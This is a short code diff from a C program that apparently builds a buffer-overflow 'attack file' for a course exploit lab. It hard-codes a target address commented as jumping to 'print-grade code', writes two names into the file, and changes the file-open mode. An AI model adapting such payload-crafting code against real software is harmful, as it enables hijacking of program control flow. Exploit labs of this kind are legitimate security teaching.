@@ -18,7 +18,7 @@ int main(void)
     const unsigned long PRINT_ADDR  = 0x40089cUL;  /* skip-B, print-grade code */
 
     /* 1) Open the attack file for binary write */
-    f = fopen("dataA", "wb");
+    f = fopen("dataA", "w");
     fprintf(f, "%s", "Ben Zhou and Owen Clarke");
     
     for (i = 0; i < 4; i++) { 
